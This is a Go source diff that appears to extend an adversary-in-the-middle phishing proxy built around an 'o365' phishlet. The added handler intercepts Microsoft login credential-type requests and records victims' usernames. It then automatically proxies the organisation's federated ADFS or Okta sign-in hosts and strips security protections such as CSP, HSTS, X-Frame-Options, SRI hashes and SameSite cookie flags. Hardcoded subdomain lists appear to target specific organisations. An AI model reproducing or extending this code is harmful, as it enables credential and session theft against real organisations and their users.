@@ -20,6 +20,7 @@ import (
 	"io"
 	"io/ioutil"
 	"math/rand"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -34,6 +35,7 @@ import (
 
 	"golang.org/x/net/proxy"
 
+	"github.com/bobesa/go-domain-util/domainutil"
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
@@ -67,6 +69,41 @@ const (
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+
+func subFilterExists(trigger string, to_compare SubFilter, subfilters map[string][]SubFilter) (result bool) {
+	result = false
+	for hostname, slice := range subfilters {
+		if hostname != trigger {
+			continue
+		}
+		for _, filter := range slice {
+			isSame := to_compare.domain == filter.domain &&
+				to_compare.subdomain == filter.subdomain &&
+				to_compare.regexp == filter.regexp &&
+				to_compare.replace == filter.replace
+
+			if isSame {
+				result = true
+				break
+			}
+		}
+	}
+	return result
+}
+
+func proxyHostExists(to_compare ProxyHost, slice []ProxyHost) (result bool) {
+	result = false
+	for _, filter := range slice {
+		isSame := to_compare.domain == filter.domain &&
+			to_compare.orig_subdomain == filter.orig_subdomain
+
+		if isSame {
+			result = true
+			break
+		}
+	}
+	return result
+}
 
 type HttpProxy struct {
 	Server   *http.Server
@@ -741,6 +778,273 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !req_ok {
 						return p.blockRequest(req)
 					}
+				}
+
+				// ========================================================================
+				// ADFS HANDLER
+				// ========================================================================
+
+				// ========================================================================
+				// ADFS HANDLER
+				// ========================================================================
+
+				isCredRequest := strings.Contains(req_url, "common/GetCredentialType")
+				if isCredRequest {
+					contents, err := io.ReadAll(req.Body)
+					if err != nil {
+						log.Error("ReadAll: %v", err)
+					}
+					defer req.Body.Close()
+
+					type GCTformat struct {
+						Username                       string `json:"username"`
+						IsOtherIdpSupported            bool   `json:"isOtherIdpSupported,omitempty"`
+						CheckPhones                    bool   `json:"checkPhones,omitempty"`
+						IsRemoteNGCSupported           bool   `json:"isRemoteNGCSupported,omitempty"`
+						IsCookieBannerShown            bool   `json:"isCookieBannerShown,omitempty"`
+						IsFidoSupported                bool   `json:"isFidoSupported,omitempty"`
+						OriginalRequest                string `json:"originalRequest,omitempty"`
+						Country                        string `json:"country,omitempty"`
+						Forceotclogin                  bool   `json:"forceotclogin,omitempty"`
+						IsExternalFederationDisallowed bool   `json:"isExternalFederationDisallowed,omitempty"`
+						IsRemoteConnectSupported       bool   `json:"isRemoteConnectSupported,omitempty"`
+						FederationFlags                int    `json:"federationFlags,omitempty"`
+						IsSignup                       bool   `json:"isSignup,omitempty"`
+						FlowToken                      string `json:"flowToken,omitempty"`
+						IsAccessPassSupported          bool   `json:"isAccessPassSupported,omitempty"`
+					}
+					var gct_reqdata GCTformat
+					err = json.Unmarshal(contents, &gct_reqdata)
+					if err != nil {
+						log.Error("%v", err)
+					}
+
+					o365_pl := p.cfg.phishlets["o365"]
+					if o365_pl == nil {
+						log.Error("o365 phishlet not found in config")
+						return req, nil
+					}
+
+					sc, err := req.Cookie(p.cookieName)
+					ok := false
+					if err == nil {
+						ps.Index, ok = p.sids[sc.Value]
+						if ok {
+							ps.SessionId = sc.Value
+						}
+					} else if err != nil && !p.isWhitelistedIP(remote_addr, pl.Name) {
+						session, err := NewSession(o365_pl.Name)
+						if err == nil {
+							sid := p.last_sid
+							p.last_sid += 1
+							p.sessions[session.Id] = session
+							p.sids[session.Id] = sid
+							ps.SessionId = session.Id
+							ps.Created = true
+							ps.Index = sid
+						}
+					} else {
+						ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
+						if ok {
+							ps.Index, ok = p.sids[ps.SessionId]
+						}
+					}
+					if !ok {
+						log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl.Name), req_url, req.Header.Get("User-Agent"), remote_addr)
+					}
+
+					p.setSessionUsername(ps.SessionId, gct_reqdata.Username)
+					log.Success("[%d] Username: [%s]", ps.Index, gct_reqdata.Username)
+					if err := p.db.SetSessionUsername(ps.SessionId, gct_reqdata.Username); err != nil {
+						log.Error("database: %v", err)
+					}
+
+					comp_req := GCTformat{Username: gct_reqdata.Username, OriginalRequest: gct_reqdata.OriginalRequest, IsOtherIdpSupported: gct_reqdata.IsOtherIdpSupported}
+					json_data, err := json.Marshal(comp_req)
+					if err != nil {
+						log.Error("%v", err)
+					}
+
+					httpposturl := "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
+					rresponse, err := http.Post(httpposturl, "application/json", bytes.NewBuffer(json_data))
+					if err != nil {
+						log.Error("%v", err)
+					}
+
+					resbody, err := io.ReadAll(rresponse.Body)
+					if err != nil {
+						log.Error("%v", err)
+					}
+					defer rresponse.Body.Close()
+
+					type respmsg struct {
+						Username       string `json:"Username"`
+						Display        string `json:"Display"`
+						IfExistsResult int    `json:"IfExistsResult"`
+						IsUnmanaged    bool   `json:"IsUnmanaged"`
+						ThrottleStatus int    `json:"ThrottleStatus"`
+						Credentials    struct {
+							PrefCredential        int         `json:"PrefCredential"`
+							HasPassword           bool        `json:"HasPassword"`
+							RemoteNgcParams       interface{} `json:"RemoteNgcParams"`
+							FidoParams            interface{} `json:"FidoParams"`
+							SasParams             interface{} `json:"SasParams"`
+							CertAuthParams        interface{} `json:"CertAuthParams"`
+							GoogleParams          interface{} `json:"GoogleParams"`
+							FacebookParams        interface{} `json:"FacebookParams"`
+							FederationRedirectURL string      `json:"FederationRedirectUrl"`
+						} `json:"Credentials"`
+						EstsProperties struct {
+							DomainType int `json:"DomainType"`
+						} `json:"EstsProperties"`
+						IsSignupDisallowed bool   `json:"IsSignupDisallowed"`
+						APICanary          string `json:"apiCanary"`
+					}
+
+					var res respmsg
+					err = json.Unmarshal(resbody, &res)
+					if err != nil {
+						log.Error("%v", err)
+					}
+
+					redir_link := res.Credentials.FederationRedirectURL
+
+					if len(redir_link) == 0 {
+						log.Debug("FederationRedirectURL empty in JSON: [%v]", string(resbody))
+						resbody = p.patchUrls(o365_pl, resbody, CONVERT_TO_PHISHING_URLS)
+						cred_resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(resbody))
+						return nil, cred_resp
+					}
+
+					// CHECK IF THIS IS A GODADDY FEDERATION REDIRECT
+					isGoDaddy := strings.Contains(strings.ToLower(redir_link), "godaddy") ||
+						strings.Contains(strings.ToLower(redir_link), "secureserver") ||
+						strings.Contains(strings.ToLower(redir_link), "gd.app")
+
+					if isGoDaddy {
+						log.Warning("GoDaddy federation detected, skipping automatic ADFS proxy/subfilter addition")
+						// Still need to patch URLs and return the response, but don't add proxy hosts/subfilters
+						resbody = p.patchUrls(o365_pl, resbody, CONVERT_TO_PHISHING_URLS)
+						cred_resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(resbody))
+						return nil, cred_resp
+					}
+
+					// Continue with normal ADFS handling for non-GoDaddy federations
+					redir_url, err := url.Parse(redir_link)
+					if err != nil {
+						log.Error("url.Parse: %v", err)
+					}
+					redir_hostname := redir_url.Hostname()
+					domain := domainutil.Domain(redir_hostname)
+					subdomain := domainutil.Subdomain(redir_hostname)
+					subdomain_1level := strings.Split(subdomain, ".")[0]
+
+					log.Debug("Proxy Host Redirect Hostname Log [%v] %v.%v (%v.%v)", redir_hostname, subdomain, domain, subdomain_1level, domain)
+					if !proxyHostExists(ProxyHost{phish_subdomain: subdomain, orig_subdomain: subdomain, domain: domain}, o365_pl.proxyHosts) {
+						o365_pl.addProxyHost(subdomain, subdomain, domain, true, false, false)
+					}
+					//site_subdomain_id := mrand.Intn(100)
+					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s", subdomain_1level), orig_subdomain: subdomain, domain: domain}, o365_pl.proxyHosts) {
+						o365_pl.addProxyHost(fmt.Sprintf("%s", subdomain_1level), subdomain, domain, true, false, false)
+					}
+					site_subdomain_id_2 := mrand.Intn(100)
+					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("sso-%d", site_subdomain_id_2), orig_subdomain: "sso", domain: domain}, o365_pl.proxyHosts) {
+						o365_pl.addProxyHost(fmt.Sprintf("sso-%d", site_subdomain_id_2), "sso", domain, true, false, false)
+					}
+					//site_subdomain_id_3 := mrand.Intn(100)
+					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s", subdomain), orig_subdomain: subdomain, domain: domain + ":443"}, o365_pl.proxyHosts) {
+						o365_pl.addProxyHost(fmt.Sprintf("%s", subdomain), subdomain, domain+":443", true, false, false)
+					}
+					site_subdomain_id_4 := mrand.Intn(100)
+					if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("%s-%d", subdomain, site_subdomain_id_4), orig_subdomain: subdomain, domain: "okta.com"}, o365_pl.proxyHosts) {
+						o365_pl.addProxyHost(fmt.Sprintf("%s-%d", subdomain, site_subdomain_id_4), subdomain, "okta.com", true, false, false)
+					}
+
+					// This causes connection to sometimes fail when connecting to login.microsoftonline.com
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: "login", domain: "microsoftonline.com", regexp: "{hostname}", replace: "{hostname}"}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, "login", "microsoftonline.com", []string{"text/html", "application/json", "application/javascript"}, "{hostname}", "{hostname}", false, []string{})
+					}
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: "{hostname}", replace: "{hostname}"}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html", "application/json", "application/javascript"}, "https://{hostname}", "https://{hostname}", false, []string{})
+					}
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `<meta http-equiv="Content-Security-Policy" content="(.*?)"`, replace: `<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';"`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html", "application/json", "application/javascript"}, `<meta http-equiv="Content-Security-Policy" content="(.*?)"`, `<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';"`, false, []string{})
+					}
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `sha384-.{64}`, replace: ``}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, p.auto_filter_mimes, `sha384-.{64}`, "", false, []string{})
+					}
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: "okta.com", regexp: `{domain}`, replace: `{domain}`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, "okta.com", p.auto_filter_mimes, `{domain}`, "{domain}", false, []string{})
+					}
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `integrity="[^"]*"`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `integrity="[^"]*"`, "", true, []string{})
+					}
+					// 2. Remove or relax HTTP CSP headers
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `Content-Security-Policy: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `Content-Security-Policy: [^\r\n]*`, `Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src *; frame-src *; style-src * 'unsafe-inline'; font-src *;`, true, []string{})
+					}
+					// 3. Remove X-Frame-Options
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `X-Frame-Options: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `X-Frame-Options: [^\r\n]*`, "", true, []string{})
+					}
+					// 4. Remove Strict-Transport-Security
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `Strict-Transport-Security: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `Strict-Transport-Security: [^\r\n]*`, "", true, []string{})
+					}
+					// // 5. Remove Cross-Origin-Opener-Policy
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `Cross-Origin-Opener-Policy: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `Cross-Origin-Opener-Policy: [^\r\n]*`, "", true, []string{})
+					}
+					// // 6. Remove Cross-Origin-Resource-Policy
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `Cross-Origin-Resource-Policy: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `Cross-Origin-Resource-Policy: [^\r\n]*`, "", true, []string{})
+					}
+					// 7. Rewrite SameSite cookie attributes
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `SameSite=(Strict|Lax)`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `SameSite=(Strict|Lax)`, `SameSite=None`, true, []string{})
+					}
+					// 8. Remove Referrer-Policy
+					if !subFilterExists(redir_hostname, SubFilter{subdomain: subdomain, domain: domain, regexp: `Referrer-Policy: [^\r\n]*`}, o365_pl.subfilters) {
+						o365_pl.addSubFilter(redir_hostname, subdomain, domain, []string{"text/html"}, `Referrer-Policy: [^\r\n]*`, "", true, []string{})
+					}
+					safenetSubs := []string{"status.saspce", "status.eu", "status", "status.sta", "pki.us", "pki.eu", "eu", "us", "testacme", "acme", "www", "pki", "pce", "tmx.idp.eu", "tmx.idp", "tmx.idp.us", "www.tmx.idp.us"}
+					winstonSubs := []string{"Email-cr", "Email-hk", "Email-ln", "Email-wm", "email.yuandawinston.com", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "email.yuandawinston.com", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "owa-ch", "outlook-ch", "email-ch", "outlook-dc", "owa-dc", "Email-cr", "Email-hk", "Email-ln", "Email-wm", "Mail", "email-ch", "email-cr", "email-hk", "email-ln", "email-wm", "mail", "email-wm", "email-cr", "email-wm", "mail", "email-cl", "email-hk", "email-pa", "email-sf", "email-dc", "email-la", "email-ho", "email-ny", "outlook-ny", "outlook-sf", "outlook-ln", "owa-ln", "certmail-wm", "email-wm", "email-ln", "email-cr", "certmail-wm", "email-wm", "email-wm"}
+					novSubs := []string{"nov.kerberos", "autotallyassetportal", "Politemail", "Politemail-Read", "securelogin", "access", "owas", "mail", "access", "lseuraccess", "logindev", "lshouaccess", "login", "lsbjgaccess", "ls13gdyaccess", "eumail-old", "eurportal", "euportalcsg", "euowamail", "myaccount", "myaccountqa", "asiamail", "weurportal", "myaccountdev", "politemail-read", "mailbjg", "mailedm", "politemail", "spgdevportal", "mailgw01", "asiaowamail", "mail5sw", "sgpportal", "mailabd", "www.access", "seaportal", "lssngaccess", "accessdev", "maildst1", "mailgw02", "mail-old", "owamail", "owas-krs", "dsportalqas", "mailchl", "mailfra", "dhcustomerportal", "gdyportal", "canmail", "login", "www.login", "logindev", "www.logindev", "eumaildev", "dalportal", "eurportal", "gdyportal", "Portal", "scusportal", "seaportal", "uaenportal", "weurportal", "mail", "PoliteMail", "PoliteMail-Read", "www.PoliteMail", "SGPPortal", "dalportal", "eurportal", "gdyportal", "Portal", "seaportal", "mail", "rigportal", "owas", "webdamlogin", "eumail", "PoliteMail", "PoliteMail-Read", "mysupplierportal", "rigsupplierportal-prod", "myaccess", "mail", "eumail", "portal", "www.portal", "eurportal", "gdyportal", "portal", "sgpportal", "portaltest", "portal", "LsBjgAccess", "directaccess", "Eumail", "EuMail", "EUMail", "mail", "lshouaccess", "LsSngAccess", "Portal", "LsEurAccess", "Eumail", "mail", "Asiamail", "mail", "AsiaMail", "mail", "LS13GdyAccess", "asiamail", "canmail", "mail", "DirectAccess", "LsSngAccess", "euportal", "dhcustomerportal", "Asiamail", "mail", "Eumail", "EUMail"}
+					for _, sub := range safenetSubs {
+						subdomain_1level := strings.Split(sub, ".")[0]
+						site_subdomain_id := mrand.Intn(100)
+						if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
+							o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
+						}
+						if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
+							o365_pl.addSubFilter(redir_hostname, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
+						}
+					}
+					for _, sub := range winstonSubs {
+						subdomain_1level := strings.Split(sub, ".")[0]
+						site_subdomain_id := mrand.Intn(100)
+						if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
+							o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
+						}
+						if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
+							o365_pl.addSubFilter("myaccount."+domain, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
+						}
+					}
+					for _, sub := range novSubs {
+						subdomain_1level := strings.Split(sub, ".")[0]
+						site_subdomain_id := mrand.Intn(100)
+						if !proxyHostExists(ProxyHost{phish_subdomain: fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), orig_subdomain: sub, domain: domain}, o365_pl.proxyHosts) {
+							o365_pl.addProxyHost(fmt.Sprintf("ssl-%s-%d", subdomain_1level, site_subdomain_id), sub, domain, true, false, true)
+						}
+						if !subFilterExists(redir_hostname, SubFilter{subdomain: sub, domain: domain, regexp: `{hostname}`, replace: `{hostname}`}, o365_pl.subfilters) {
+							o365_pl.addSubFilter("myaccount."+domain, sub, domain, p.auto_filter_mimes, `{hostname}`, "{hostname}", false, []string{})
+						}
+					}
+					p.cfg.phishlets["o365"] = o365_pl
+					p.cfg.refreshActiveHostnames()
+					resbody = p.patchUrls(o365_pl, resbody, CONVERT_TO_PHISHING_URLS)
+					cred_resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(resbody))
+					return nil, cred_resp
 				}
 
 				if ps.SessionId != "" {
@@ -2759,6 +3063,18 @@ func (p *HttpProxy) getClientIdentifier(req *http.Request) string {
 func (p *HttpProxy) SetHttp2Enabled(enabled bool) {
 }
 
+func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
+	pl := p.getPhishletByPhishHost(hostname)
+	if pl != nil {
+		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
+		return sid, ok
+	}
+	return "", false
+}
+
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
 		ptypes := []string{"http", "https", "socks5", "socks5h"}
@@ -2823,6 +3139,25 @@ func (dumb dumbResponseWriter) WriteHeader(code int) {
 
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
+}
+
+func (p *HttpProxy) getRealIP(req *http.Request) string {
+	// Check Cloudflare headers first
+	if cfIP := req.Header.Get("CF-Connecting-IP"); cfIP != "" {
+		return cfIP
+	}
+
+	// Fall back to standard proxy headers
+	proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "True-Client-IP"}
+	for _, h := range proxyHeaders {
+		if ip := req.Header.Get(h); ip != "" {
+			return strings.TrimSpace(strings.Split(ip, ",")[0])
+		}
+	}
+
+	// Last resort: use remote address
+	ip, _, _ := net.SplitHostPort(req.RemoteAddr)
+	return ip
 }
 
 func getContentType(path string, data []byte) string {
